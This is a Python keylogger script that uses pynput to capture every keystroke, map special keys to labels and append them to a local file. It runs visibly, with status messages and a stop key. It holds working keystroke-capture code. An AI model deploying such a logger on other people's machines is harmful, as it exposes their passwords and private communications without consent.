"""
keylogger.py — Captures keystrokes using pynput and saves them to a file.

Usage:
    python keylogger.py [--output keylog.txt] [--stop-key F9]

Controls:
    • Press the stop key (default: F9) to stop recording and exit.
    • Ctrl+C in the terminal also stops the listener cleanly.

Requirements:
    pip install pynput
"""

import argparse
import datetime
import signal
import sys
from pathlib import Path
from pynput import keyboard

# ── CLI arguments ──────────────────────────────────────────────────────────────

parser = argparse.ArgumentParser(description="Keystroke logger using pynput")
parser.add_argument(
    "--output", "-o",
    default="keylog.txt",
    help="File path where keystrokes are saved (default: keylog.txt)",
)
parser.add_argument(
    "--stop-key", "-s",
    default="f9",
    help="Key name that stops the logger (default: f9). "
         "Use key names like f9, esc, scroll_lock, etc.",
)
args = parser.parse_args()

OUTPUT_FILE = Path(args.output)
STOP_KEY_NAME = args.stop_key.lower()

# ── Helpers ────────────────────────────────────────────────────────────────────

def resolve_stop_key(name: str):
    """Return a pynput Key constant or a single character for the stop key."""
    try:
        return keyboard.Key[name]          # e.g. 'f9' → Key.f9
    except KeyError:
        if len(name) == 1:
            return keyboard.KeyCode.from_char(name)
        print(f"[ERROR] Unknown stop key: '{name}'. "
              "Use a pynput Key name (f9, esc, …) or a single character.")
        sys.exit(1)

STOP_KEY = resolve_stop_key(STOP_KEY_NAME)

def format_key(key) -> str:
    """Convert a pynput key event to a readable string."""
    try:
        # Printable character
        return key.char if key.char is not None else f"[{key}]"
    except AttributeError:
        # Special key  (Key.space, Key.enter, …)
        name = str(key).replace("Key.", "")
        special = {
            "space": " ",
            "enter": "\n",
            "tab":   "\t",
            "backspace": "[BACKSPACE]",
            "caps_lock":  "[CAPS_LOCK]",
            "shift":      "[SHIFT]",
            "shift_r":    "[SHIFT]",
            "ctrl_l":     "[CTRL]",
            "ctrl_r":     "[CTRL]",
            "alt_l":      "[ALT]",
            "alt_r":      "[ALT]",
            "cmd":        "[CMD]",
            "delete":     "[DELETE]",
            "home":       "[HOME]",
            "end":        "[END]",
            "page_up":    "[PAGE_UP]",
            "page_down":  "[PAGE_DOWN]",
            "up":         "[UP]",
            "down":       "[DOWN]",
            "left":       "[LEFT]",
            "right":      "[RIGHT]",
            "esc":        "[ESC]",
            "f1": "[F1]", "f2": "[F2]", "f3": "[F3]", "f4": "[F4]",
            "f5": "[F5]", "f6": "[F6]", "f7": "[F7]", "f8": "[F8]",
            "f9": "[F9]", "f10": "[F10]", "f11": "[F11]", "f12": "[F12]",
        }
        return special.get(name, f"[{name.upper()}]")

# ── Listener callbacks ─────────────────────────────────────────────────────────

log_file = OUTPUT_FILE.open("a", encoding="utf-8")

def write(text: str):
    log_file.write(text)
    log_file.flush()

def on_press(key):
    if key == STOP_KEY:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        write(f"\n\n--- Recording stopped at {timestamp} ---\n")
        log_file.close()
        print(f"\n[INFO] Stop key pressed. Log saved to '{OUTPUT_FILE}'.")
        return False          # Returning False stops the listener

    write(format_key(key))

def on_release(key):
    pass  # Not used; here for potential extension

# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write(f"--- Recording started at {timestamp} ---\n")

    print(f"[INFO] Keystroke logger started.")
    print(f"       Output : {OUTPUT_FILE.resolve()}")
    print(f"       Stop   : press {STOP_KEY_NAME.upper()} (or Ctrl+C)\n")

    # Allow Ctrl+C to stop cleanly
    def handle_sigint(sig, frame):
        write(f"\n\n--- Recording interrupted at "
              f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        log_file.close()
        print(f"\n[INFO] Interrupted. Log saved to '{OUTPUT_FILE}'.")
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()